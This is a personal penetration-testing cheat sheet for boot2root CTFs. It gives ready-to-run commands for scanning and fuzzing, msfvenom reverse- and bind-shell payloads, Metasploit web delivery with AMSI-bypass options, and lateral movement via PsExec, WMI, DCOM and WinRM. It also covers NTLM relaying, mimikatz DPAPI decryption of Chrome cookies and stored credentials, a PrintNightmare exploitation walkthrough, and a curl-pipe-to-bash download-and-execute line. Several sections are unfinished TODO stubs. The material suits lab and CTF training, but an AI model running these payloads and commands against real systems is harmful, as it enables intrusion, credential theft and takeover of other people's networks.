# Enumeration

Useful host enumeration snippets for boot2root-style CTFs.

## Remote Host Enumeration

### Port Scans

Nmap snippets for initial enumeration and situational awareness (`-sT` used for speed; in real-life scenarios, use TCP SYN scanning with `-sS`):

```sh
export HOST=scanme.nmap.org

# Quick TCP port scan on common ports.
nmap -vv -n -Pn -sT -sV -sC --top-ports 1000 -oN $'nmap.tcp.quick.'${HOST}$'.'$(date -Iseconds) $HOST

# Thorough and complete TCP port scan on all ports.
nmap -vv -n -Pn -sT -sV -sC -p- -oN $'nmap.tcp.thorough.'${HOST}$'.'$(date -Iseconds) $HOST

# UDP scan.
nmap -vv -n -Pn -sV -sC -sU -oN $'nmap.udp.'${HOST}$'.'$(date -Iseconds) $HOST

# Subnet scan, including a ping sweep.
nmap -vv -n -sT 10.10.10.0/24

# Subnet scan without a ping sweep.
nmap -vv -n -Pn -sT 10.10.10.0/24
```

### Subnet Sweeps

Nmap subnet scan with ping sweep:

```sh
nmap -vv -n -sT 10.10.10.0/24
```

Linux native ping sweep (runs in parallel):

```sh
export SUBNET=192.168.33
for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i is up" &); done
```

Windows native ping sweeps:

```bat
:: Option 1: Ping sequentially and record hits.
FOR /L %i IN (1,1,254) DO ping -n 1 192.168.10.%i | FIND /i "Reply">>up-hosts.txt

:: Option 2: Ping broadcast address and look for new arp cache entries after a few
::           seconds.
for /L %a in (1,1,254) do start ping 192.168.0.%a
arp -a

:: Option 3: PowerShell version of Option 2.
powershell -ExecutionPolicy Bypass -c "0..255 | ForEach-Object {ping 192.168.1.$_}"
arp -a
```

### HTTP Enumeration

#### Directory Scanning

[`gobuster`](https://github.com/OJ/gobuster) is the go-to tool for HTTP directory enumeration. Here's a good standard one-liner to get started:

```sh
export URL=http://scanme.nmap.org/
gobuster dir --useragent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -u $URL | tee $'gobuster.'$(date -Iseconds)
```

Don't forget to add `-x php,xhtml`-style arguments based on any determined common file extensions.

Alternatively, `wfuzz` should be available natively on Kali:

```sh
wfuzz -c -z file,/usr/share/dirb/wordlists/common.txt --hc 404 $URL/FUZZ.php
```

If you just want to look for some quick-and-easy wins, this `curl` snippet will get you started:

```sh
export URL=http://scanme.nmap.org
for path in robots.txt sitemap.xml security.txt .git/HEAD; do curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' $URL/$path; done
```

If you have some known file names, you can generate permutations of "backup" versions of these files with the following:

```sh
export FILES='one two three'
python3 -c "from itertools import product as p; print('\n'.join(a+b for a,b in p(__import__('os').getenv('FILES').split(),(c+d for c,d in p(['.bak','.swp','.backup','.txt'],['','~','.tgz','.zip','.tar.gz','.gz'])))))"
```

#### Web Application Firewall (WAF) Detection

[wafw00f](https://github.com/EnableSecurity/wafw00f) should be your go-to tool for WAF detection and fingerprinting. It has pretty straightforward usage:

```sh
export URL=http://scanme.nmap.org
wafw00f $URL
```

#### Fuzzing HTTP Parameters and Fields

Your friends for HTTP fuzzing wordlists will be the [SecLists](https://github.com/danielmiessler/SecLists) and [FuzzDB](https://github.com/fuzzdb-project/fuzzdb) projects. The best open source HTTP fuzzing engine that I know of is the [wfuzz project](https://github.com/xmendez/wfuzz). Here are some useful snippets combining these two awesome projects:

```sh
export URL=http://scanme.nmap.org

# fuzzing a URL parameter
wfuzz -c -z file,/opt/SecLists/Fuzzing/special-chars.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' --hc 404 $URL/FUZZ

# fuzzing the user-agent; -H works for any other header, too
wfuzz -c -z file,/opt/SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H 'User-Agent: FUZZ' --hc 403,404  $URL

# fuzzing a POST login form with multiple parameters
wfuzz -c -z file,/opt/fuzzdb/wordlists-user-passwd/names/namelist.txt -z file,/opt/fuzzdb/wordlists-user-passwd/passwds/john.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -d 'username=FUZZ&password=FUZ2Z' --hc 403 $URL/wp-login.php

# fuzzing HTTP verbs
wfuzz -c -z file,/opt/fuzzdb/attack/http-protocol/http-protocol-methods.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -X FUZZ --hc 403 $URL
```

#### Vhost and Subdomain Enumeration

Fuzzing vhost routing and web server subdomains with `wfuzz` (below example hides pages of length `1337` to look for anomalous responses):

```sh
wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/big.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -H 'Host: FUZZ.target.tld' --hl 1337 $URL
```

## Local Host Enumeration

This section goes over some automated methods. For manual checks, take a look at [my other pentesting snippet reference](https://pages.brianwel.ch/hacks).

### Automated Scripts

Projects like [LinEnum](https://github.com/rebootuser/LinEnum) are great for automating tedious privilege escalation checks. Here is a snippet for downloading and running from the public web:

```sh
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Process Watching

A lot of information can be gleaned by watching changes to [procfs](https://en.wikipedia.org/wiki/Procfs). An amazing tool for automating this is [`pspy`](https://github.com/DominicBreuker/pspy).

## Meterpreter Snippets

### Payload Generation

Here are some snippets for generating common meterpreter payloads:

```sh
export LISTEN_IP='10.10.10.10'
export LISTEN_PORT='443'

# Linux 64-bit reverse shell meterpreter.
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f elf > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.elf"

# Linux 32-bit reverse shell meterpreter.
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f elf > "reverse-shell_x86_${LISTEN_IP}_${LISTEN_PORT}.elf"

# Linux 64-bit bind shell meterpreter.
msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86-64_${LISTEN_PORT}.elf"

# Linux 32-bit bind shell meterpreter.
msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86_${LISTEN_PORT}.elf"

# Windows 64-bit reverse shell meterpreter.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.exe"

# Windows 32-bit reverse shell meterpreter.
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86_${LISTEN_IP}_${LISTEN_PORT}.exe"

# Windows 64-bit bind shell meterpreter.
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86-64_${LISTEN_PORT}.exe"

# Windows 32-bit bind shell meterpreter.
msfvenom -p windows/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86_${LISTEN_PORT}.exe"
```

When ready, set up a meterpreter listener/connector using something like the following metasploit command:

```
handler -H 10.10.10.10 -P 443 -p windows/x64/meterpreter/bind_tcp
```

### Routing Through Sessions

If you have a meterpreter session on a jump point in the network, you can have tools implicitly route their traffic through that point by adding a routing rule in metasploit:

```sh
# Make traffic to the 10.10.10.0/24 subnet route through session 1.
route add 10.10.10.0/24 1
```

### Meterpreter Port Scanning

For TCP port scans from a meterpreter session, use the following:

```
use auxiliary/scanner/portscan/tcp
set rhosts 10.10.10.10
set ports 1-65535
```

This is especially useful when routing through existing meterpreter sessions.

### Web Delivery

The [web delivery Metasploit module](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) can be useful for executing meterpreter agents on target in-memory when you can run commands but don't have a great interactive environment yet:

```sh
use exploit/multi/script/web_delivery

# Adjust payload as necessary; make sure to use a staged payload, otherwise generated
# PowerShell commmands will likely exceed the 8192-character command-line limit on
# Windows.
set payload payload/windows/x64/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 1337

# For in-memory PowerShell payload.
set target PSH

# For PowerShell payload that gets dropped to disk.
set target PSH (Binary)

# If you run into reported errors about PowerShell command length being too long, try
# disabling the generated AMSI bypasses that get added:
set Powershell::prepend_protections_bypass false

# Run the module. This will host the final payload on an HTTP server, print the
# command to be run on target to download and execute the payload, and run the
# payload module for the final connection (i.e., start a listener for a reverse
# TCP payload).
run
```

### Authenticated Windows Code Execution Modules

With credentials (or an NTLM hash), the following modules can be used to execute meterpreter payloads on targets (see [here](https://www.infosecmatter.com/rce-on-windows-from-linux-part-5-metasploit-framework/) for a good reference):

```
use auxiliary/admin/smb/psexec_command
use exploit/windows/smb/psexec_psh
use exploit/windows/smb/psexec
use auxiliary/scanner/smb/impacket/dcomexec
use auxiliary/scanner/smb/impacket/wmiexec
```

## Windows Local Enumeration and Pivoting

### File System Enumeration

To find files by their modification date, you can use filters like `datemodified:last week` or `datemodified:yesterday` in File Explorer.

Recursively searching for needle strings in files can be done in PowerShell:

```powershell
# Get files that contain the needle string.
Get-ChildItem -Recurse | Select-String "needle" -List | Select Path
```

And from a native `cmd.exe` shell (as explained [here](https://stackoverflow.com/a/699283)):

```bat
findstr /spin /c:"needle" [files]
```

Listing files in typical locations of interest:

```powershell
TODO: %TEMP% folders for all users
(Get-ChildItem -Recurse -Path \Windows\Temp).fullname
(Get-ChildItem -Recurse -Path \Users\*\Desktop).fullname
(Get-ChildItem -Recurse -Path \Users\*\Documents).fullname

# Example that excludes folders:
(Get-ChildItem -Recurse -Path \Windows\Temp).fullname | Where-Object { !$_PSIsContainer }
```

### Active Directory Enumeration

Some nice overview resources include:

* [The DFIR Report - From Zero to Domain Admin](https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/)

#### Inititial Reconnaissance

```bat
:: Get more information about your user and other domain users.
whoami /priv
net user USERNAME /domain
net users /domain
net localgroup Administrators
net group Administrators /domain
```

Getting a lay of the land with PowerShell:

```powershell
# Get AD users.
Get-ADUser -Filter * | select UserPrincipalName

# Get AD administrators.
Get-ADGroupMember -Identity "Domain Admins" -Recursive | select name
Get-ADGroupMember -Identity "Enterprise Admins" -Recursive | select name

# Get hosts on the domain.
Get-ADComputer -Filter * | select DNSHostName

# Enumerate SMB shares.
Get-SmbShare
```

### Scheduled Task Enumeration

```powershell
# Look at all scheduled tasks at high level.
Get-ScheduledTask | format-table TaskName, TaskPath, Description

# Look at arguments / commands associated with tasks.
(Get-ScheduledTask).Actions
(Get-ScheduledTask | where TaskName -EQ 'test').Actions
```

### Service Enumeration

```powershell
# Enumerate all services with their program name and arguments displayed.
Get-WmiObject win32_service | Format-List Name, Description, PathName

# Look at a specific service.
Get-WmiObject win32_service | Where-Object {$_.Name -eq 'Schedule'} | Format-List Name, Description, PathName
```

### Interacting with Native Protocols

#### SMB

Using native Windows utilities:

```bat
:: Basic check to see if we have administrator access to the remote machine.
dir \\HOST\C$
```

[`PsExec.exe`](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), with admin privileges, lets you open shells on other Windows boxes:

```bat
psexec.exe -accepteula \\10.10.10.10 cmd.exe
```

[`smbmap.py`](https://github.com/ShawnDEvans/smbmap) also can automate a few SMB enumeration tasks from a Linux workstation:

```sh
# Show access to drives.
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10

# List files in a directory.
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 -r 'C$\Users'

# Execute a command.
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 -x 'whoami'

# Download/upload files.
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 --download 'C$\temp\file.txt'
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 --upload './local/payload.exe' 'C$\temp\upload.exe'
```

Impacket's [`smbexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) and [`smbclient.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) provide similar tooling:

```sh
# smbexec.py differs slightly from psexec.py in the way that output is captured. Since
# output is written to and read from an SMB share folder, we also have the option of
# hosting a server locally and having command output written to / read from our attack
# machine (requring root to listen on port 445).
impacket-smbexec MyDomain/MyUsername:MyPassword@10.10.10.10
sudo impacket-smbexec -mode SERVER MyDomain/MyUsername:MyPassword@10.10.10.10

# smbclient.py gives an semi-interactive shell capable of interacting with the remote
# file system and querying other information.
impacket-smbclient MyDomain/MyUsername:MyPassword@10.10.10.10
```

[`winexe`](https://tools.kali.org/maintaining-access/winexe) is yet another option from a Linux workstation:

```sh
winexe -U 'MyUsername%MyPassword' //10.10.10.10 'hostname'
```

We can also kick off payloads by creating and starting a service on a remote machine:

```bat
copy payload.exe \\10.10.10.10\C$\windows\temp
sc \\10.10.10.10 create MyService binpath= "C:\windows\temp\payload.exe"
sc \\10.10.10.10 start MyService

:: We need to migrate out of the service process relatively quickly; consequently,
:: we should probably be using a meterpreter payload and configure a handler to
:: auto-migrate:
use exploit/multi/handler
set LHOST 10.10.10.11
set LPORT 31337
set PAYLOAD windows/meterpreter/reverse_tcp
set AutoRunScript post/windows/manage/migrate
execute -j
```

#### PowerShell Remoting and WinRM

Helpful resources for WinRM and PS remoting can be found in [a look under the hood at PowerShell Remoting through a cross platform lens](http://www.hurryupandwait.io/blog/a-look-under-the-hood-at-powershell-remoting-through-a-ruby-cross-plaform-lens).

Using raw WinRM to run commands on other machines:

```bat
:: Specify protocol and port.
winrs.exe -r:http://10.10.10.10:5985 -u:MyUsername -p:MyPassword whoami

:: Or just specify the hostname.
winrs.exe -r:MyName.MyDomain -u:MyUsername -p:MyPassword whoami
```

Using PowerShell remoting to gain interactive sessions on remote machines (useful discussion can be found [here](https://www.ired.team/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement) and [here](https://adamtheautomator.com/psremoting/)):

```powershell
# May need to enable remoting and add our attack machine as a trusted host.
Enable-PSRemoting -Force
# The below will make everything a trusted host; after this changed is applied, the
# WinRM service must be restarted.
Set-Item wsman:localhostclienttrustedhosts *
Restart-Service WinRM

# Check for WinRM listeners on a box you want to connect to (from that box).
winrm e winrm/config/listener

# Check if a remote session is listening and accessible on the default WinRM
# port (from your attack machine).
Test-NetConnection 10.10.10.10 -CommonTCPPort WINRM

# Enter a new PowerShell remoting session.
Enter-PSSession 10.10.10.10

# Enter a new session with specified credentials/authentication mechanism.
$cred = Get-Credential
Enter-PSSession 10.10.10.10 -Credential $cred
Enter-PSSession 10.10.10.10 -Credential MyDomain\MyUsername
Enter-PSSession 10.10.10.10 -Authentication Kerberos

# Show sessions.
Get-PSSession

# Upload/download files to/from remote session.
Copy-Item -Path \temp\payload.exe -Destination \temp -ToSession $sess
Copy-Item -Path C:\Users\Dummy\Desktop\juicy.txt -Destination \loot -FromSession $sess
```

Alternatively, to run commands from a Linux attack machine:

```sh
crackmapexec winrm 10.10.10.10 -d DOMAIN -u USER -p PASSWORD -x whoami
```

#### WMI

WMI allows for some remote management options natively from Windows (with admin access on target machines). Some PowerShell examples:

```powershell
# Check to see if we have administrator access to the machine.
Get-WMIObject -Class win32_operatingsystem -Computername 10.10.10.10
```

Some examples from `cmd.exe`:

```bat
:: Execute a binary on another machine.
wmic /node:10.10.10.10 process call create payload.exe
```

From a Linux workstation, Impacket's [`wmiquery.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiquery.py) and [`wmiexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) provide some query and execution tooling:

```sh
# Query users on a system.
impacket-wmiquery MyDomain/MyUsername:MyPassword@10.10.10.10
# Enter a query like: Select * from Win32_UserAccount

# Query event filter related entities.
impacket-wmiquery --namespace //./root/subscription MyDomain/MyUsername:MyPassword@10.10.10.10
# Enter a queries like:
# Select * from __EventFilter
# Select * from CommandLineEventConsumer
# Select * from __FilterToConsumerBinding

# Pop an interactive session on a target.
impacket-wmiexec MyDomain/MyUsername:MyPassword@10.10.10.10
```

See [Hunting for Impacket](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/) for a blue team perspective on identifying the use of these tools.

Enumerate WMI persistence (see [here](https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96)):

```powershell
# Assuming we are looking for an event filter with 'needle' in the name (omit
# -Filter to see all entities):
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='needle'"
Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer "Name='needle'"
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding "__Path LIKE '%needle%'"

# To remove the entities associated with that filter, we can append the following to the above commands:
| Remove-WmiObject -Verbose
```

#### DCOM

Useful resources:

* [Lateral movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [Lateral movement via DCOM round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* [New lateral movement techniques abuse DCOM technology](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)

DCOM presents a protocol that can allow for command execution over remote application-specific channels (sometimes not requiring admin access to targets):

```powershell
$target = "10.10.10.10"

# Execute a command via the MMC20.Application COM object.
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $target))
$com.Document.ActiveView.ExecuteShellCommand("C:\temp\payload.exe", $null, "-cmd -line -args", "7")
```

This process can also be performed from a Linux workstation via [`dcomexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py):

```sh
# Supported objects: MMC20, ShellWindows, ShellBrowserWindow.
impacket-dcomexec -object MMC20 MyDomain/MyUser:MyPassword@10.10.10.10
```

#### RDP

Enable RDP:

```powershell
Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
Test-NetConnection 10.10.10.10 -CommonTCPPort rdp
```

Add specific users to have RDP permission:

```bat
net localgroup "Remote Desktop Users" DOMAIN\USER /add
```

#### Other Useful Impacket Scripts

The following Impacket scripts also provide useful remote query capabilities (some example use can be found [here](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)):

* [`GetADUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py)
* [`GetUserSPNs.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
* [`atexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [`dpapi.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py)
* [`ntlmrelayx.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)
* [`registry-read.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/registry-read.py)
* [`smbrelayx.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py)
* [`services.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/services.py)

### Forced Authentication

You can make a variety of Windows applications authenticate to you, leaking information such as username and Net-NTLM hashes. The go-to tools for such endeavors include [Responder](https://github.com/lgandx/Responder) (from Linux attack machines) and [Inveigh](https://github.com/Kevin-Robertson/Inveigh) (from Windows attack machines).

For a nice reference of payload files and catching authentication attempts with Responder, see [this `ired.team` page](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication).

#### Cracking Net-NTLM Hashes

Because the leaked hashes are Net-NTLM hashes (as opposed to NTLM; read [here](https://medium.com/@petergombos/lm-ntlm-net-ntlmv2-oh-my-a9b235c58ed4) for an explanation on the differences), they cannot be used directly in pass-the-hash techniques. However, the original underlying password can be bruteforced:

```sh
hashcat -m 5600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

#### Relaying Hashes

In the event the leaked hashes cannot be cracked, they can still be relayed to achieve code execution on other hosts on the domain (provided that [SMB signing](https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing) is disabled). Some details of the underlying mechanics behind SMB relaying are discuseed in the 2015 BlackHat talk [SMB: Sharing More Than Just Your Files](https://www.blackhat.com/docs/us-15/materials/us-15-Brossard-SMBv2-Sharing-More-Than-Just-Your-Files.pdf).

A nice practical guide can be found in byt3bl33d3r's [Practical guide to NTLM Relaying in 2017 ](https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html).

Because SMB signing must be disabled for relaying to work, the first step is to check if the target host has it enabled:

```sh
# Check a single host.
crackmapexec smb 10.10.10.0

# Check an entire subnet and record results in a file.
crackmapexec smb --gen-relay-list ./relayable-hosts.txt 10.10.10.0/24

# Alternatively, use Responder's RunFinger.py.
responder-RunFinger -i 10.10.10.0/24
```

TODO: Pairing ntlmrelayx with Responder.

### Kerberos

TODO

### Passing the Hash

[This Cobalt Strike blog post](https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/) talks through a use case to pass the hash to gain a different token for a local process, which can then be used to interact with different remote systems under the context of a different user.

TODO

#### NTLM Relaying

TODO

### File System Enumeration

TODO

### C2 Frameworks

### PowerShell Empire

Useful cheatsheet can be found [here](https://github.com/HarmJ0y/CheatSheets/blob/master/Empire.pdf).

### Pillaging Credentials

#### Pillaging Offline

[`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) can be used to dump hashes from , both over the network and offline from hive files.

```sh
TODO
```

Guide on dumping Windows credential files and dumping hashes from them offline with `secretsdump.py` can be found [here](https://airman604.medium.com/dumping-active-directory-password-hashes-deb9468d1633).

#### DPAPI Fun with Mimikatz

[DPAPI](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/) credential decryption; in user-mode, DPAPI provides a set of encryption/decryption routines using a master key derived from a user's password. This is used by things like Chrome to encrypt cookies and saved logins (`harmj0y` link provides details on this).

For example, the following mimikatz command will list out Chrome's stored cookie names and associated domains (the lack of a provided password means the actual values cannot be decrypted):

```bat
:: List out cookies.
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies"

:: If executing in the context of the user that "owns" those cookies, we can decrypt without the password.
dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Cookies" /unprotect
```

It may be possible to dump the DPAPI keys for other logged in users via the following:

```bat
sekurlsa::dpapi
```

Finally, we can also derive a user's master key itself through the following (requires the user's password):

```bat
mkdir .\workspace

:: Get user's SID and needed files from subdirectory listed in below directory.
dir \users\security\appdata\roaming\microsoft\protect
copy \users\security\appdata\roaming\microsoft\protect\<SID>\<HEX FILENAME> .\workspace

:: Now, in mimikatz shell, use dpapi command to get the masterkey.
dpapi::masterkey /in:<HEX FILENAME> /sid:<SID> /password:<USER'S PASSWORD>
:: This should display the masterkey, which is also stored the mimikatz session. If we
:: can't make use of a continous mimikatz session, then DPAPI keys can be specified in
:: commands with the /masterkey option. This cache can always be viewed with
:: dpapi::cache.

:: Now, we can decrypt encrypted credentials like:
dpapi::cred /in:<FILENAME>
```

Also see [the mimikatz wiki article on decrypting Credential Manager stored credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials). The `harmj0y` post linked above also goes into detail about more advanced domain techniques.

## Common Windows Vulnerabilities

TODO

### Zerologon

POC is available [here](https://github.com/bb00/zer0dump).

### PrintNightmare

Example usage of PrintNightmare privilege escalation technique (using Metasploit):

```sh
# Inside msfconsole, generate a payload DLL (and corresponding handler) to be executed
# in an elevated context.
use payload/windows/x64/meterpreter/reverse_https
set LHOST 10.10.14.105
set LPORT 8888
to_handler
generate -f dll -o /home/user/payload-hosting/nightmare.dll

# Outside of msfconsole, host the DLL on an SMB share so the victim can download it.
cd ~/payload-hosting
cat <<EOF >smb.conf
[myshare]
	comment = Public Directories
	path = /home/user/payload-hosting
	guest ok = Yes
EOF
sudo smbd --interactive --configfile=./smb.conf

# Back in msfconsole, configure the PrintNightmare module and kick off exploitation.
use auxiliary/admin/dcerpc/cve_2021_1675_printnightmare
set DLL_PATH \\\\10.10.14.105\\myshare\\nightmare.dll
set RHOSTS 10.10.11.106
set SMBUser KNOWN_USER
set SMBPass KNOWN_PASS
```

## Linux Local Enumeration and Pivoting

### File System Enumeration

Find the most recently changed files on the file system (alternative methods discussed [here](https://stackoverflow.com/a/7448828)):

```sh
find /start-directory -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2-
```

Find files affected by ACLs (as explained [here](https://superuser.com/questions/398448/find-files-with-acls-set)):

```sh
getfacl -R -s -p /directory | sed -n 's/^# file: //p'
```

## Cracking Hashes

### Hashcat

See [Hashcat example hashes page](https://hashcat.net/wiki/doku.php?id=example_hashes).

Hashcat example for breaking md5crypt with a wordlist:

```sh
hashcat -m 500 -a 0 hash.lst /usr/share/wordlists/rockyou.txt
```

## Bruteforcing and Spraying Creds

### Bruteforcing

TODO

### Spraying

TODO: cme?
